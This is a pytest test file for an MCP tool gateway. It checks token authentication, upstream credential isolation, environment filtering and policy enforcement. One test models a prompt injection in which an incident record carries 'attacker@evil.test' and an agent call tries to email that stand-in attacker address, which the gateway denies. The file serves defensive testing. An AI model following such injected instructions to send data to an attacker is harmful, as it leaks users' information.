"""The gateway over real MCP (P1b-5): an agent on streamable HTTP with a session token, the
gateway holding the upstream's credential, and a real upstream server over stdio.

Skipped without the ``mcp`` extra.
"""
from __future__ import annotations

import asyncio
import json
from pathlib import Path
import socket
import sys
import threading
import time

import pytest

# The repository's own mcp/ directory imports as a namespace package, so check for the SDK
# modules actually used rather than for the name "mcp".
pytest.importorskip("mcp.client.streamable_http")
pytest.importorskip("httpx2")
import httpx2  # noqa: E402  (installed with the mcp extra)
import uvicorn  # noqa: E402
from mcp import ClientSession  # noqa: E402
from mcp.client.streamable_http import streamable_http_client  # noqa: E402

from vais import ArgumentPolicy, ConfidentialityLevel, Policy, ToolPolicy  # noqa: E402
from vais.exceptions import PolicyValidationError  # noqa: E402
from vais.gateway import token_digest  # noqa: E402
from vais.gateway_server import build_app, load_gateway_config, resolve_secrets  # noqa: E402
from vais.mcp import MCPEffectMapping, MCPProfile, MCPResultPolicy, MCPToolBinding  # noqa: E402

TOKEN = "session-token-a91d"
UPSTREAM_KEY = "test-upstream-key-5b1e"
UPSTREAM = Path(__file__).with_name("gateway_upstream.py")

PROFILE = MCPProfile(bindings=(
    MCPToolBinding("ops", "get_incident", "mcp:ops:get_incident", MCPResultPolicy(ConfidentialityLevel.INTERNAL)),
    MCPToolBinding("ops", "send_email", "mcp:ops:send_email",
                   effect=MCPEffectMapping("email_sent", {"recipient": "recipient"})),
    MCPToolBinding("ops", "check_credential", "mcp:ops:check_credential"),
    MCPToolBinding("ops", "environment_names", "mcp:ops:environment_names"),
))

POLICY = Policy(version=5, default_action="deny", tools={
    "mcp:ops:get_incident": ToolPolicy(allow=True, arguments={"incident_id": ArgumentPolicy("trusted")}),
    "mcp:ops:send_email": ToolPolicy(allow=True, arguments={"recipient": ArgumentPolicy("trusted"), "body": ArgumentPolicy()}),
    "mcp:ops:check_credential": ToolPolicy(allow=True),
    "mcp:ops:environment_names": ToolPolicy(allow=True),
})

CONTRACT = """\
version: 1
token_sha256: {digest}
principal_id: alice
session_id: s-1
tenant_id: acme
capability_id: root
allowed_tools: [mcp:ops:get_incident, mcp:ops:send_email, mcp:ops:check_credential, mcp:ops:environment_names]
bound_arguments:
  mcp:ops:get_incident: {{incident_id: INC-7}}
  mcp:ops:send_email: {{recipient: ir-team@acme.test}}
"""


def _free_port() -> int:
    with socket.socket() as sock:
        sock.bind(("127.0.0.1", 0))
        return sock.getsockname()[1]


@pytest.fixture
def gateway(tmp_path, monkeypatch):
    monkeypatch.setenv("VAIS_TEST_UPSTREAM_KEY", UPSTREAM_KEY)
    monkeypatch.setenv("VAIS_TEST_GATEWAY_ONLY", "not-for-upstreams")
    (tmp_path / "contracts").mkdir()
    (tmp_path / "contracts" / "alice.yaml").write_text(CONTRACT.format(digest=token_digest(TOKEN)), encoding="utf-8")
    outbox = tmp_path / "outbox.jsonl"
    port = _free_port()
    config_path = tmp_path / "gateway.yaml"
    config_path.write_text(json.dumps({
        "version": 1,
        "listen": {"host": "127.0.0.1", "port": port},
        "policy": "unused-policy.yaml", "profile": "unused-profile.yaml",
        "contracts": "contracts", "approvals": "approvals.json", "pending": "pending", "audit": "audit.jsonl",
        "upstreams": {"ops": {"stdio": {
            "command": sys.executable, "args": [str(UPSTREAM)],
            "env": {"UPSTREAM_API_KEY": "${env:VAIS_TEST_UPSTREAM_KEY}", "OUTBOX": str(outbox)},
        }}},
    }), encoding="utf-8")
    config = load_gateway_config(config_path)
    server = uvicorn.Server(uvicorn.Config(build_app(config, policy=POLICY, profile=PROFILE),
                                           host="127.0.0.1", port=port, log_level="warning", lifespan="on"))
    thread = threading.Thread(target=lambda: asyncio.run(server.serve()), daemon=True)
    thread.start()
    deadline = time.monotonic() + 30
    while not server.started:
        assert thread.is_alive() and time.monotonic() < deadline, "gateway did not start"
        time.sleep(0.05)
    yield f"http://127.0.0.1:{port}/mcp", tmp_path, outbox
    server.should_exit = True
    thread.join(timeout=15)


async def _session_run(url: str, token: str, work):
    async with httpx2.AsyncClient(headers={"Authorization": f"Bearer {token}"}) as http:
        async with streamable_http_client(url, http_client=http) as (read, write):
            async with ClientSession(read, write) as session:
                await session.initialize()
                return await work(session)


def _text(result) -> str:
    return "\n".join(item.text for item in result.content if getattr(item, "text", None) is not None)


def _value(result):
    """A tool's return value: the SDK wraps a plain return as structured {"result": ...}."""
    if result.structured_content is not None:
        return result.structured_content["result"]
    return _text(result)


def test_the_agent_sees_its_tools_and_the_gateway_holds_the_credential(gateway):
    url, tmp_path, _ = gateway

    async def work(session):
        tools = sorted(tool.name for tool in (await session.list_tools()).tools)
        credential = await session.call_tool("ops.check_credential", {})
        return tools, credential

    tools, credential = asyncio.run(_session_run(url, TOKEN, work))
    assert tools == ["ops.check_credential", "ops.environment_names", "ops.get_incident", "ops.send_email"]
    assert not credential.is_error and _value(credential) == "authorized"
    assert UPSTREAM_KEY not in (tmp_path / "audit.jsonl").read_text(encoding="utf-8")


def test_the_upstream_receives_only_its_configured_environment(gateway):
    url, _, _ = gateway
    names = asyncio.run(_session_run(url, TOKEN, lambda s: s.call_tool("ops.environment_names", {})))
    visible = _value(names)
    assert "UPSTREAM_API_KEY" in visible
    assert "VAIS_TEST_GATEWAY_ONLY" not in visible
    assert "VAIS_TEST_UPSTREAM_KEY" not in visible


def test_the_injection_is_read_and_its_effect_is_refused(gateway):
    url, _, outbox = gateway

    async def work(session):
        incident = await session.call_tool("ops.get_incident", {"incident_id": "INC-7"})
        attack = await session.call_tool("ops.send_email", {"recipient": "attacker@evil.test", "body": "summary"})
        legit = await session.call_tool("ops.send_email", {"recipient": "ir-team@acme.test", "body": "summary"})
        return incident, attack, legit

    incident, attack, legit = asyncio.run(_session_run(url, TOKEN, work))
    assert "attacker@evil.test" in _value(incident)
    assert attack.is_error and _text(attack) == "denied"
    assert not legit.is_error
    assert [json.loads(line)["recipient"] for line in outbox.read_text(encoding="utf-8").splitlines()] == [
        "ir-team@acme.test"]


def test_a_request_without_a_registered_token_is_refused_before_mcp(gateway):
    url, _, _ = gateway

    async def probe(headers):
        async with httpx2.AsyncClient() as http:
            response = await http.post(url, headers=headers, json={
                "jsonrpc": "2.0", "id": 1, "method": "initialize",
                "params": {"protocolVersion": "2025-06-18", "capabilities": {},
                           "clientInfo": {"name": "probe", "version": "0"}}})
            return response.status_code

    for headers in ({}, {"Authorization": "Bearer wrong"}, {"Authorization": f"Basic {TOKEN}"}):
        assert asyncio.run(probe(headers)) == 401


def test_a_missing_secret_fails_startup_and_names_only_the_variable():
    with pytest.raises(PolicyValidationError, match="NOT_SET_ANYWHERE") as caught:
        resolve_secrets({"KEY": "prefix-${env:NOT_SET_ANYWHERE}"}, environ={"OTHER": "value-1"})
    assert "value-1" not in str(caught.value)
    assert resolve_secrets({"H": "Bearer ${env:T}"}, environ={"T": "abc"}) == {"H": "Bearer abc"}
